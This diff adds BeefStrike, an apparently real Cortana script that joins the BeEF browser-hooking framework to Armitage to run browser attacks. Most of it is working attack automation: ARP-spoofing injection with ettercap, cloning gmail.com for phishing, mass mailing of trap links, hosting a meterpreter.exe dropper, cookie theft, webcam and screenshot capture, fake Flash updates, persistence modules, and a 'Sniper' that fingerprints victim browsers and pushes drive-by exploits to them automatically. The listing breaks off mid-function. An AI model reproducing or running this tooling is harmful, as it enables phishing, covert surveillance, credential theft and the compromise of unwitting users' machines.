@@ -1,0 +1,1210 @@
+############################ WARNING !!!##################################################
+##										        ##
+##		Before beginning to use this script, change all the 			##									 															  
+##	"import" lines ... Obviously you must put the right path for each Library. 	##
+##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"	##
+##											##
+##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
+##		README file and watch Youtube video demo before use it  		##
+##											##	
+##											##	
+##                  >   by Beny Green    <						##
+##		 [  aka @TheBenyGreen	  ]			                        ##				 				
+##	 			 							##													 																  
+##########################################################################################
+import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-logging-1.1.3.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-beanutils-1.8.3.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-collections-3.2.1.jar;
+import net.sf.json.* from:  C:\BeefLib\dist\lib\json-lib.jar;
+import net.sf.ezmorph.* from:  C:\BeefLib\dist\lib\ezmorph-1.0.6.jar;
+
+################### CORE variables ###############################################
+
+#global('@beef_hosts @beef_hostsoff @beef_cmde @beef_result $key $beefUrl $user $pass');
+@beef_hosts = @(%());  # array of beef online zombies
+@beef_hostsoff = @(%());  # array of beef offline zombies
+@beef_cmde = @(%());  # array of beef commandes - list
+@beef_result = @(%());  # array of beef command result - list [NOT USE YET]
+$key = "00000000000000000000000" ; # the MUCH important RESTful API key
+$beefhook = ""; # Beef hook link
+$zombieNumMonitor = 0 ; # monitor the variation of the zombies number
+$size_on = 0; $size_off = 0;
+# SNIPER variables
+@browser_profile_list = @(%());
+@autorundisabled = @();
+$assault_mode = 1;
+$targets_id = 0 ;
+$id_analyz = 0;
+$id_beef_autorun = 0 ;
+$beefpath = "/usr/share/beef-xss" ;
+######################## Introduction ###########################################
+on ready {
+	$console = console();
+	$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+	cmd($console , " \c8 Using beefmetasploitplugin is no longer a need for BeefStrike. But we always take care for some users usage.");
+	cmd($console , "load beef");
+	say("Beef_Strike is running");
+	}
+
+on console_beef_connect {
+	}
+#########################  BeEF  MENU BAR    ####################################
+popup attacks {
+	menu "BeEF Strike"{
+		menu "Start" {
+			item "Connect" {
+			cmd($console , "beef_disconnect");
+			$beefUrl = prompt_text("BeEF Server (with http://). Don't use loopback","http://192.168.1.22:4000");
+			$user = prompt_text("User","beef");
+			$pass = prompt_text("Password","beef");
+			$connect = "curl -H \"Content-Type: application/json; charset=UTF-8\"  -X POST -d '{\"username\":\"$user\", \"password\":\"$pass\"}' " . $beefUrl . "/api/admin/login";
+			cmd($console , "$connect");
+			cmd($console , "beef_connect $beefUrl $user $pass");sleep(30);
+			$beefhook = "" . $beefUrl. "/hook.js" ;
+			append($console, "\c9[+] BeEF Hook URL : " . $beefhook . "");
+			show_message(" [+] Copy and add your RESTful_API_Key (Token)"); 
+			}
+			item " Key" {
+				$key = prompt_text("Copy and Paste RESTful_API_Key here","$key");
+					if ($key ne "00000000000000000000000" ){ 	
+					fill(); sleep(1000);
+					show_message("Well done, now wait for new zombie.");
+					}else{show_message("Your key cannot be the default 0000000000000000 ");}
+				println("Here is the REST_ful API Key: $key ");
+			}
+
+			menu "Control BeEF service" {
+				item "BeEF PATH" {
+				$beefpath = prompt_text("Enter path to BeEF main folder","$beefpath");
+				append($console, "\c9[*] BeEF FOLDER PATH : " . $beefpath . "");
+				}
+				item "START" { cmd_async("service beef-xss start");  }
+				item "STOP" { cmd_async("service beef-xss stop"); }
+				item "CONFIG" { cmd_async("xterm -e 'vim " . $beefpath . "/config.yaml '");
+					cmd_async("xterm -e 'vim " . $beefpath . "/extensions/social_engineering/config.yaml '");
+					cmd_async("xterm -e 'vim " . $beefpath . "/extensions/social_engineering/config.yaml '");
+					}
+				item "CUSTOMHOOK" { cmd_async("xterm -e 'vim " . $beefpath . "/extensions/customhook/config.yaml'");
+					append($console, "\cC[*] Another windows have been open in your Teamserver machine \n Configure and enable CUSTOM HOOK EXTENSION");	
+					append($console, "\cC[*]\cC Help : http://blog.beefproject.com/2013/01/beef-qr-fun.html -- by @xntrik");
+					append($console, "\cC[*] URL SHORTNER SERVICE LIST :\n > ow.ly \n > bit.ly \n > goo.gl \n > t.co \n See long list : http://longurl.org/services");	
+					}
+				item "MOUNT FILE" { 
+					if ($key ne "00000000000000000000000" ){ 
+					$file2host = prompt_text("The name of the file to host","meterpreter.exe");
+					$file2path = prompt_text("Full path of the file to host","/root");
+					cmd_async("cp " . $file2path . " " . $beefpath . "/extensions/social_engineering/droppers");
+					$file2hosturipath = prompt_text("URIPATH of the file to host","/file.exe");
+					$link = "" . $beefUrl . "/api/server/bind?token=$key" ; 
+					$mount = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"mount\":\"" . $file2hosturipath . "\",\"local_file\": \"/extensions/social_engineering/droppers/" . $file2host . "\"} ' -X POST " . $link . "" ;				
+					cmd($console , "$mount");
+					} else {show_message("You need to setup REST_ful API Key before use it (o_O) ! ");}
+					}
+			}
+		}
+		menu "Recruitment" {
+#use ettercap filter for html injection - low injection success rate.
+			item "Ettercap method" {
+					$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
+					$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
+					cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
+					cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
+					cmd($console , "\c9[+] ettercap filter > Contamination beging ...");
+					show_message("ettercap filter > Contamination beging ...");
+			}
+			item "Web Cloner"{
+				append($console, "[o] Help : http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html -- by @antisnatchor");
+				$site2clone = prompt_text("URL to Clone : ","http://gmail.com");
+				$uripath = prompt_text("URIPATH : ","/login.aspx");
+				$beefcloned = "" . $beefUrl . "";
+				$link = "" . $beefUrl . "/api/seng/clone_page?token=$key";
+				$webcloning = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"uri\":\"" . $site2clone . "\", \"mount\":\"" . $uripath . "\"}' -X POST "  . $link . "";
+				cmd($console , "$webcloning");
+			}
+			item "Mass Mailer"{
+			    append($console, "[o] Help : http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html -- by @antisnatchor");
+				$mailtemplate = prompt_text("Mail template: ","default");
+				$mailsubject = prompt_text("Mail Subject : ","New Privacy policy");
+				$fromname = prompt_text("From : ","BeEF team");
+				$beeftraplink = prompt_text("URL of trap page : ","$beefcloned");
+				$beefspooftraplink = prompt_text("Link's Text of the trap page : ","$site2clone");
+				$recipients = prompt_text("RECIPIENTS :","\"antisnatchor@example.com\":\"Michelle\",\"rsmudge@example.com\":\"Raphael\""); 
+				$link = "" . $beefUrl . "/api/seng/send_mails?token=$key" ; 
+				$sendmail = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"template\":\"" . $mailtemplate . "\",\"subject\":\"" . $mailsubject . "\",\"fromname\": \"" . $fromname . "\",\"link\": \"" . $beeftraplink . "\",\"linktext\": \"" . $beefspooftraplink . "\",\"recipients\": [{" . $recipients . "}]} ' -X POST " . $link . "" ;				
+			    cmd($console , "$sendmail");
+			}
+			item "Other method"{
+				show_message("[Recruitment method idea] \n XSS scanning : find permanent xss vulns and inject beef hooks.\n Better LAN injection: Googling for Shank.rb, LANs.py \nDemos: youtube.com/thebenygreen");				}
+			}
+		item "Horde of zombies" {
+			local('$zombitableoff');
+			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
+			refresh_hostsoff($zombitableoff);
+			# two tab is open for Online and offline zombies.
+			local('$zombitable');
+			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh", "More details"), "zmb_hook", 1);
+			refresh_hosts($zombitable);
+			}
+	#	menu "Commands Results " {
+	#		item "See Results tracking Table" {
+	#			local('$resultable');
+	#			$resultable = open_table_tab("Results", "", @("name", "ip", "sessionID", "commandID", "resultID"), @(), @("Refresh results"), "result_hook", 1);
+	#			refresh_result($resultable);
+	#		}
+	#		item "Set the current command_id tracking value" {
+	#			$id_result = prompt_text("Put the last command_id value from the console.","");
+	#			$id_result = $id_result + 1 ;
+	#		}
+	#	}
+		item "BeEF Console" {
+				$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+				cmd($console , "load beef");
+				cmd($console , "beef_connect $beefUrl $user $pass");
+				}
+		item "Web UI panel" {
+				$beefUrlpanel = "/ui/panel";
+				url_open("$beefUrl $+ $beefUrlpanel");
+				}
+	}
+}
+
+popup hosts_top {
+	menu "IP Geolocation" { 
+		item "Satellite" {
+			$iploc = prompt_text("IP to localize ","8.8.8.8");
+			$freegeoip_url = "http://freegeoip.net/json/" . $iploc . "";
+			$maptype = "satellite";
+			$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+			geomap($json_freegeoip, $maptype);
+				}
+		item "Roadmap" {
+			$iploc = prompt_text("IP to localize ","8.8.8.8");
+			$freegeoip_url = "http://freegeoip.net/json/" . $iploc . "";
+			$maptype = "roadmap";
+			$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+			geomap($json_freegeoip, $maptype);
+				}
+		item "Geobytes web page" {
+				 $geobyte_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&IpAddress=" ;
+				 url_open("$geobyte_url $+ $1"); 
+  				}				
+		}
+}
+
+on host_add {cmd($console , "\n \c9 [+] New zombie with IP: $1");}
+
+# The heart beat of BeefStrike, specify the frequency of each update : zombie online and offline list, zombie importation
+on heartbeat_5s {
+	zombiupdate();
+	}
+################### Menu of action to interact with each zombie #################
+popup zmb_hook {
+			@idr = flatten(table_selected($1, "id"));
+			@adr = flatten(table_selected($1, "address"));
+			@sessidr = flatten(table_selected($1, "sessionID"));
+			$idr = @idr[0]; 
+			$adr = @adr[0];
+			$sessidr = @sessidr[0];
+		item "Informations" { 
+			zombi_info($idr);
+			}
+		menu "Recon." {
+			item "Port scan" { 
+				$cmde_param = prompt_text("Ports to scan (example:)","\"ipHost\":\"192.168.1.10\",\"ports\":\"default\",\"closetimeout\":\"1100\",\"opentimeout\"=\"2500\",\"delay\"=\"600\",\"debug\"=\"false\"");
+				send_beefcmd_with_param($sessidr, $code_portscan, $cmde_param, 0, $adr);
+			}
+			item "Ping Sweep" {
+				$cmde_param = prompt_text("IP to Ping ","\"ipRange\":\"192.168.1.1-192.168.1.1.254\",\"timeout\":\"2000\",\"delay\":\"100\"");
+				send_beefcmd_with_param($sessidr, $code_pingjav, "", 0, $adr);
+				}
+			item "DNS Enumeration" { 
+				$cmde_param = prompt_text("DNS enumeration ","\"dns_list\":\"%default%\",\"timeout\":\"4000\"");
+				send_beefcmd_with_param($sessidr, $code_dnsenum, "", 0, $adr);	
+				}
+			item "Fingerprint Network" {
+				$cmde_param = prompt_text("Internal network fingerprinting ","\"ipRange\":\"192.168.1.1-192.168.1.1.254\",\"ports\":\"80,8080,445\"");
+				send_beefcmd_with_param($sessidr, $code_fingnetwork, "", 0, $adr);
+				}
+			}
+		menu "Attack" {
+			item "Drive-by" { 
+				local ('$inviframe');
+				$inviframe = prompt_text("URL (with http://)","http://");
+				append($console, "\c4[*] Come here baby !");
+				append($console , "Send invisible iframe : " . $inviframe . " --> " . $sessidr . "" );
+				run_driveby($beefUrl, $sessidr, $key, $inviframe);
+				}
+			item "Raw JS" {
+				$cmde_param = prompt_text("JS code (here is the example to follow)","\"cmd\":\"alert(WTF);\"");
+				send_beefcmd_with_param($sessidr, $code_rawjs, $cmde_param, 0, $adr);
+				} 		
+	 		}
+		menu "Special" {
+			item "Get_cookie" {	
+				send_beef_cmd_without_param($sessidr, $code_getcookie, $adr);
+				}
+			item "Screenshot" {
+				send_beefcmd_with_param($sessidr, $code_screenshot,"", 0, $adr);
+				}
+			item "Webcam" {
+				send_beefcmd_with_param($sessidr, $code_webcam,"", 1, $adr);
+				# The picture is sent as a base64 encoded JPG string
+				# Copy the base64 text into a file called picture.txt (it’ll start with /9y/ and end in ==). 
+				# Then you can decode it in the command line with the following:
+				# $ base64 -d -i picture.txt > picture.jpg
+				}
+			menu "Geolocation" { #110
+					item "Satellite" {
+					send_beef_cmd_without_param($sessidr, $code_geoloc, $adr);
+					$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
+					$maptype = "satellite";
+					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+					geomap($json_freegeoip, $maptype);
+					}
+					item "Roadmap" {
+					send_beef_cmd_without_param($sessidr, $code_geoloc, $adr);
+					$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
+					$maptype = "roadmap";
+					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+					geomap($json_freegeoip, $maptype);
+					}		
+				}
+			item "Send command " { 
+				local ('$idcmde');
+				append($console , "Send Command ID to >>>" . $adr . "" );
+				$idcmde = prompt_text("Command ID","27");
+				send_beefcmd_with_param($sessidr, $idcmde, "", 1, $adr);
+				}
+			}
+		menu "Social Eng." {
+			item "Clickjacking" {	
+				send_beefcmd_with_param($sessidr, $code_clickjak,"", 1, $adr);
+				}
+			item "TabNabbing" {	
+				send_beefcmd_with_param($sessidr, $code_tabnabbing,"", 1, $adr);
+				}
+			item "Fake flash update" {	
+				send_beefcmd_with_param($sessidr, $code_fakeflash,"", 1, $adr);
+				}
+			item "Pretty thief" {	
+				send_beefcmd_with_param($sessidr, $code_theft,"", 1, $adr);
+				}
+			item "Clippy" {	
+				send_beefcmd_with_param($sessidr, $code_clippy,"", 1, $adr);
+				}		}
+		menu "Persistence" {
+			item "MiTB" {	
+				send_beefcmd_with_param($sessidr, $code_persist_mitb,"", 1, $adr);
+				}
+			item "Foreground iFrame" {	
+				send_beefcmd_with_param($sessidr, $code_persist_iframe,"", 1, $adr);
+				}
+			item "Confirm close tab" {	
+				send_beefcmd_with_param($sessidr, $code_persist_closetab,"", 1, $adr);
+				}
+			}
+		item "Unhook" {
+				append($console , "Unhook : " . $idr . " -> Pushed out off the horde" );
+				send_beef_cmd_without_param($sessidr, $code_unhook, $adr);
+		}
+	}	
+
+popup result_hook {
+			@cmdid = flatten(table_selected($1, "commandID"));
+			@rsltid = flatten(table_selected($1, "resultID"));
+			@sessid = flatten(table_selected($1, "sessionID"));
+			@cmdnam = flatten(table_selected($1, "name"));
+			$cmdid = @cmdid[0]; 
+			$rsltid  = @rsltid [0];
+			$sessid = @sessid[0];
+			$cmdnam = @cmdnam[0];
+			$link = "$beefUrl $+ /api/modules/ $+ $sessid $+ / $+ $cmdid $+ / $+ $rsltid $+ ?token= $+ $key";
+		item "Take a look" {
+			append($console ,"\c8 [  $cmdnam  ]"); 
+			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . "" ;
+			cmd($console , "$send_url");sleep(20);
+			}
+}	
+# This function send beEF command without param !
+sub send_beef_cmd_without_param {
+			result_tracker($1, $2, $3);
+			$link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key";
+			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{}' -X POST " . $link . ""; # " > beefcmdresult.json";
+			cmd($console , "$send_url");sleep(20);
+}
+	
+# Send beef command with params using sesion ID and RESTfull_API key 	
+sub send_beefcmd_with_param {
+	
+	if ($4 == 1) { $cmde_param = prompt_text("Configure option(s) or leave empty for default values.","\"param1\":\"value1\",\"param2\":\"value2\""); }
+	else { $cmde_param = $3; }
+	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key"; # $4 is the param
+	$attak2 = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{" . $cmde_param . "}' -X POST " . $link2 . ""; #" > beefcmdresult.json";
+	cmd($console , "$attak2"); sleep(20);
+	
+	#$handlef = openf("/root/beefcmdresult.json");
+	#while $readf (readln($handlef)){
+	#	$jsrs = [new JSONObject];
+	#	$jsrs = [JSONSerializer toJSON: "$readf"];
+	#	$id_result = [[$js get: "command_id"] toString];
+	#	println($id_result);
+	#	result_tracker($1, $2, $5);
+	#}
+		
+	}
+
+sub result_tracker {
+	for ($i = 0; $i < size(@beef_cmde); $i++)   {
+		if (@beef_cmde[$i]["id"] eq $2 ) {
+			$cmdename = @beef_cmde[$i]["name"] ;
+			break;} 
+	}
+	%rslt = %(name => "$cmdename", ip => "$3", sessionID => "$1", commandID => "$2", resultID => "$id_result");
+	@beef_result[$id_result] = %rslt;
+}	
+
+sub refresh_hosts {
+	table_set($1, @beef_hosts);
+	}
+	
+sub refresh_hostsoff {
+	table_set($1, @beef_hostsoff);
+}
+sub refresh_result {
+	table_set($1, @beef_result);
+}
+
+on tab_table_click {
+	if ($3 eq "Refresh") {
+		refresh_hosts($1);
+	}
+	if ($3 eq "RefreshOFF") {
+		refresh_hostsoff($1);
+	}
+	if ($3 eq "Fill it") {
+		fill_cmde_tab($1);
+	}
+	if ($3 eq "Refresh results") {
+		refresh_result($1);
+	}
+	if ($3 eq "See autorun list") {
+		local('$beef_autorun');
+		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay", "Clear All"), "autorun_hook", 1);
+		refresh_list($beef_autorun);
+		}
+	if ($3 eq "More details") {
+		local('$beef_details');
+		$beef_details = open_table_tab("Zombies details", "", @("id", "sessionID", "Browser", "UserAgent", "Type","Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "GoogleGears", "WebSocket", "HostName"), @(), @("Refresh details"), "zmb_hook", 1);
+		refresh_details($beef_details);
+		}
+	if ($3 eq "Edit Param") {
+		editparam($1);
+		}
+	if ($3 eq "Refresh profiles") {
+		refresh_profiles($1);
+	}
+	if ($3 eq "Edit") {
+		edit_profiles($1);
+	}
+	if ($3 eq "Assault Mode") {
+		if ($assault_mode == 0) {   
+			show_message( "Sniper is now in Active mode");
+			$assault_mode = 1 ;
+			}
+		if ($assault_mode == 1) {  
+			show_message("Sniper is now in Stand-by mode. \n This mode is usefull only if you want to execute manualy each action selected by the bot \n so that you stay in control of each attempt");
+			$assault_mode = 0 ;
+		    }
+	}
+	if ($3 eq "Add") {
+		add_profiles($1);
+	}
+	if ($3 eq "Delete") {
+		delete_profiles($1);
+	}
+	if ($3 eq "re-Scan") {
+		rematch();
+		refresh_analyze($1);
+	}
+	if ($3 eq "Change URL") {
+		changeurl($1);
+	}
+	if ($3 eq "Attack all") {
+		# This action tell sniper to shot all targets which appear on the line of sigh.
+		# No, this is not a FPS game. 
+		if (size(@analyze) != 0) {
+			for ($i = 0; $i < size(@analyze); $i++)   {
+				$sid = @analyze[$i]["sessionID"] ;
+				$inviframe = @analyze[$i]["Attack_URL"] ;
+				$cclink = @analyze[$i]["Link_cc"];
+							
+				if ($cclink ne "*" || $cclink ne " " || $cclink ne "-" || $cclink ne ""){
+					$targeted_cmdeid = @beef_autorun[$cclink]["id"];
+					$targeted_cmde_param = @beef_autorun[$cclink]["Param"];
+					send_beefcmd_with_param($sid, $targeted_cmdeid, $targeted_cmde_param,0,$sip); #sleep(50);
+					append($console , "\c9[*] Sniper send targeted command (+)");
+					} 
+				if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
+				run_driveby($beefUrl, $sid, $key, $inviframe);
+				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " to " . $sid . "" );
+					} else {append($console , "\c9[-] No Attack specified for Sniper" );}
+				}
+		} else {println("No profiles/zombies association found !")}
+	}
+	if ($3 eq "Refresh list") {
+		refresh_list($1);
+	}
+	if ($3 eq "Delete entry") {
+		delete_entry($1);
+	}
+	if ($3 eq "Load Clent-side Recon cmds") {
+		load_clientside_recon_mod();
+		refresh_list($1);
+	}
+	if ($3 eq "Refresh details") {
+		refresh_details($1);
+	}
+	if ($3 eq "Replay") {
+		show_message("Autorun keep track of zombies already parsed. \n This action clear that track so that autorun can be replay");
+		clear(@autorundisabled);
+		println(size(@autorundisabled));
+	}
+	if ($3 eq "Clear All") {
+		$id_beef_autorun = 0 ;
+		clear(@beef_autorun);
+		refresh_list($1);
+		}
+	if ($3 eq "Line of sight") {
+		local('$attackMap');
+		$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL", "Link_cc"), @(), @("re-Scan", "Change URL", " Attack all", "Assault Mode"), "analyze_hook", 1);
+		refresh_analyze($attackMap);
+	}
+}
+
+# So what append when we have a new zombie ?
+on zombies_news { 
+	for ($i = $1; $i < $2; $i++) {
+		add_profile($i); 
+		}
+}
+
+sub add_profile {
+	#local('$go');
+	host_add(@beef_hosts[$1]["ip"]);
+	$sid = @beef_hosts[$1]["sessionID"];
+	$sip = @beef_hosts[$1]["ip"];
+	$browser = @beef_hosts[$1]["name"];
+	append($console, "\c9 [+] Send MiTB module for Persistence.");
+	send_beefcmd_with_param($sid, $code_mitb, "", 0,"--"); # MITB Persistence #
+	host_os(@beef_hosts[$1]["ip"],@beef_hosts[$1]["OS"]);
+##### DRONE SECTION : Analyse target's profile and send a very specific URL to this target
+	# STEP 1  -  extracted informations about a particular zombie.
+	if ( size(@beef_hosts) != 0 ) {
+			$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
+			$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
+			$js = [new JSONObject];
+			$js = [JSONSerializer toJSON: "$details"];
+			$This_BrowserName = [[$js get: "BrowserName"] toString];#used by sniper
+			$This_BrowserPlugins = [[$js get: "BrowserPlugins"] toString];
+			$This_BrowserReportedName = [[$js get: "BrowserReportedName"] toString]; 
+			$This_BrowserType = [[$js get: "BrowserType"] toString];
+			$This_BrowserVersion = [[$js get: "BrowserVersion"] toString];
+			$This_HasActiveX = [[$js get: "HasActiveX"] toString];
+			$This_HasFlash = [[$js get: "HasFlash"] toString];
+			$This_HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
+			$This_HasWebSocket = [[$js get: "HasWebSocket"] toString];
+			$This_HostName = [[$js get: "HostName"] toString];
+			$This_JavaEnabled = [[$js get: "JavaEnabled"] toString];
+			$This_OsName = [[$js get: "OsName"] toString];
+			$This_SystemPlatform = [[$js get: "SystemPlatform"] toString];
+			$This_VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];
+			%extracted = %(id => "$1", sessionID => "$sid", Browser => "$This_BrowserName", UserAgent => "$This_BrowserReportedName", Type => "$This_BrowserType", Version => "$This_BrowserVersion", OS => "$This_OsName", Platform => "$This_SystemPlatform", ActiveX => "$This_HasActiveX", Flash => "$This_HasFlash", Java => "$This_JavaEnabled", VBScript => "$This_VBScriptEnabled", Plugins => "$This_BrowserPlugins", GoogleGears => "$This_HasGoogleGears", WebSocket => "$This_HasWebSocket", HostName => "$This_HostName" );
+	}
+	println("Check profile existence :"); println(%extracted["Browser"]);
+	# STEP 2  -  Try to find profiles matching with zombies's informations - if the sum is > than 0 => No match ! Pass
+	foreach $index => $value (@targets){
+			%profile = $value;
+			$decision = checker("UserAgent", %extracted) + checker("Browser", %extracted) + checker("Version", %extracted) + checker("OS", %extracted) + checker("Plugins", %extracted) + checker("Java", %extracted) + checker("Flash", %extracted) + checker("ActiveX", %extracted) + checker("Platform", %extracted) + checker("VBScript", %extracted) ;
+	# STEP 3  -  Zombies association with a client-side exploit well suited if we found one.				
+			println("$decision");
+ if ($decision == 0){
+			$inviframe = %profile["Attack_URL"];
+			$cclink = %profile["Link_cc"];
+			%analyz_dr = %(id => "$id_analyz", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe", Link_cc => "$cclink");
+			@analyze["$id_analyz"] = %analyz_dr;
+			$id_analyz = $id_analyz + 1 ;
+			append($console , "Sniper has found a target that match with one of your defined profiles " )
+			if ($cclink ne "-" || $cclink ne " " || $cclink ne "*" || $cclink ne ""){
+				$targeted_cmdeid = @beef_autorun[$cclink]["id"];
+				$targeted_cmde_param = @beef_autorun[$cclink]["Param"];
+				send_beefcmd_with_param($sid, $targeted_cmdeid, $targeted_cmde_param,0,$sip); #sleep(50);
+				append($console , "\c9[*] Sniper send targeted command (+)");
+				} 
+			if ($assault_mode == 1){
+				if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
+				run_driveby($beefUrl, $sid, $key, $inviframe);
+				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
+					} else {append($console , "\c9[-] No Attack specified for Sniper" );}
+				} 
+				else { append($console , "\cC[*] Sniper wait for assault mode activation ... "); 
+				}			
+			}else{}
+			} 
+#### AUTORUN SECTION : This action execute each command added to the beef's autorun list once a new zombie appear		
+	append($console, "\c8 [*] Check and execute Autorun commands ");
+	$lim = size(@beef_autorun);
+	if ( $size_on != 0 && $lim != 0 ) {
+		foreach $index => $sessvalue (@autorundisabled) {
+			if ( $sid ne $sessvalue){ $go = 0; } else { $go = 1; } }
+		if ( $go == 0) {
+			for ($m = 0; $m <= $lim; $m++) {
+			println("AUTORUN TRACK :"); println(@beef_autorun[$m]["browser"]);
+				if ( $browser eq @beef_autorun[$m]["browser"] || @beef_autorun[$m]["browser"] eq "All" ){
+				$cmdeid = @beef_autorun[$m]["id"];
+				$cmde_param = @beef_autorun[$m]["Param"];
+				send_beefcmd_with_param($sid, $cmdeid, $cmde_param,0,"--"); #sleep(50);
+				}
+			} push(@autorundisabled, $sid ) ; 
+		} else { println("autorun blocked");}
+	} else { println("Autorun : Nothing found");}
+	host_add(@beef_hosts[$1]["ip"]);
+	host_os($sip,$This_OsName);
+}
+
+# Build and store browsers's profiles of every new zombie
+sub update_profile {
+	if ( size(@beef_hosts) != 0 ) {
+	clear(@browser_profile_list);	
+		for ($n = 0; $n < size(@beef_hosts); $n++)   {
+			$sid = @beef_hosts[$n]["sessionID"];
+			$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
+			$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
+			$js = [new JSONObject];
+			$js = [JSONSerializer toJSON: "$details"];
+			$BrowserName = [[$js get: "BrowserName"] toString];#used by sniper
+			$BrowserPlugins = [[$js get: "BrowserPlugins"] toString];
+			$BrowserReportedName = [[$js get: "BrowserReportedName"] toString]; println($BrowserReportedName);
+			$BrowserType = [[$js get: "BrowserType"] toString];
+			$BrowserVersion = [[$js get: "BrowserVersion"] toString];
+			$HasActiveX = [[$js get: "HasActiveX"] toString];
+			$HasFlash = [[$js get: "HasFlash"] toString];
+			$HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
+			$HasWebSocket = [[$js get: "HasWebSocket"] toString];
+			$HostName = [[$js get: "HostName"] toString];
+			$JavaEnabled = [[$js get: "JavaEnabled"] toString];
+			$OsName = [[$js get: "OsName"] toString];
+			$SystemPlatform = [[$js get: "SystemPlatform"] toString];
+			$VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];
+			%browser_profile = %(id => "$n", sessionID => "$sid", Browser => "$BrowserName", UserAgent => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
+			@browser_profile_list[$n] = %browser_profile;
+		}
+	}
+}
+
+# This action try to keep your zombie list up to date inside Armitage
+sub zombiupdate {
+  if ($key ne "00000000000000000000000" ){ 
+  $hooks_list_link = "" . $beefUrl . "/api/hooks?token=" . $key . "";
+  $jsonTxt = [BeefRequester BeefGetRequest: "$hooks_list_link"];sleep(100);
+#JSON Processing ---- ONLINE ZOMBIES -----* * *------------------	
+  clear(@beef_hosts);
+  $on = [OnlineClass extractOnline: $jsonTxt ];
+	
+  for ($i = 0; $i < [$on size]; $i++)   {
+		$id = $i ;
+		$ip = [OnlineClass extractZombieData: $jsonTxt, $i, "ip"]; 
+		$name = [OnlineClass extractZombieData: $jsonTxt, $i, "name"];  
+		$version = [OnlineClass extractZombieData: $jsonTxt, $i, "version"]; 
+		$os = [OnlineClass extractZombieData: $jsonTxt, $i, "os"];  
+		$platform = [OnlineClass extractZombieData: $jsonTxt, $i, "platform"]; 
+		$domain = [OnlineClass extractZombieData: $jsonTxt, $i, "domain"]; 
+		$port = [OnlineClass extractZombieData: $jsonTxt, $i, "port"]; 
+		$page_uri = [OnlineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
+		$session = [OnlineClass extractZombieData: $jsonTxt, $i, "session"];
+		%hoston = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
+		@beef_hosts[$i] = %hoston;	
+		}
+#JSON Processing ---- OFFLINE ZOMBIES -----* * *------------------
+  clear(@beef_hostsoff);
+  $off = [OfflineClass extractOffline: $jsonTxt ];
+	
+  for ($i = 0; $i < [$off size]; $i++)   {
+		$id = $i ;
+		$ip = [OfflineClass extractZombieData: $jsonTxt, $i, "ip"]; 
+		$name = [OfflineClass extractZombieData: $jsonTxt, $i, "name"];  
+		$version = [OfflineClass extractZombieData: $jsonTxt, $i, "version"]; 
+		$os = [OfflineClass extractZombieData: $jsonTxt, $i, "os"];  
+		$platform = [OfflineClass extractZombieData: $jsonTxt, $i, "platform"]; 
